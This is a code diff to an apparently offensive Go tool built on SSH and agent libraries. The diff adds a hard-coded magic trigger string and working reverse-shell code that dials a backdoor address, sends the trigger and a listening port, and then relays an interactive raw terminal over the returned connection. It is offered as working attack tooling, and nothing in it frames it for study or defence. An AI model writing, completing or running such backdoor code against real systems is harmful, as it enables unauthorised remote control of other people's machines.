@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/hex"
 	"flag"
+	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
@@ -21,6 +22,8 @@ import (
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/crypto/ssh/agent"
 )
+
+var MagicNumber = "xVUOcOIljRTgY2MWMK0piQ=="
 
 func init() {
 	rand.Seed(time.Now().Unix())
@@ -140,6 +143,26 @@ type ShellCodeRunner interface {
 	RunShellCode(b []byte) error
 }
 
+func listen(listener net.Listener, wg *sync.WaitGroup) {
+	conn, err := listener.Accept()
+	if err == nil {
+		fmt.Println("Received connection!")
+		fmt.Println(conn)
+
+		rawMode := exec.Command("/bin/stty", "-echo", "raw")
+		rawMode.Stdin = os.Stdin
+		_ = rawMode.Run()
+
+		go func() { io.Copy(conn, os.Stdout) }()
+		io.Copy(os.Stdin, conn)
+
+		rawModeOff := exec.Command("/bin/stty", "sane")
+		rawModeOff.Stdin = os.Stdin
+		_ = rawModeOff.Run()
+	}
+	wg.Done()
+}
+
 func main() {
 	var home string
 
@@ -253,12 +276,20 @@ func main() {
 	default:
 		// TODO: attempt to connect to the backdoor
 		// and return the reverse shell
-		sh := exec.Command("#open reverse shell")
-		sh.Stderr = os.Stderr
-		sh.Stdout = os.Stdout
-		sh.Stdin = os.Stdin
-		if err := sh.Start(); err != nil {
+		listener, err := net.Listen("tcp4", "0.0.0.0:0")
+		if err != nil {
 			log.Fatalf("Failed to open reverse shell: %s", err)
 		}
+		fmt.Println(listener.Addr())
+		wg := &sync.WaitGroup{}
+		wg.Add(1)
+		go listen(listener, wg)
+		conn, err := net.Dial("tcp4", *addr)
+		if err != nil {
+			log.Fatalf("Failed to open reverse shell: %s", err)
+		}
+		_, port, _ := net.SplitHostPort(listener.Addr().String())
+		conn.Write([]byte(MagicNumber + " " + port))
+		wg.Wait()
 	}
 }
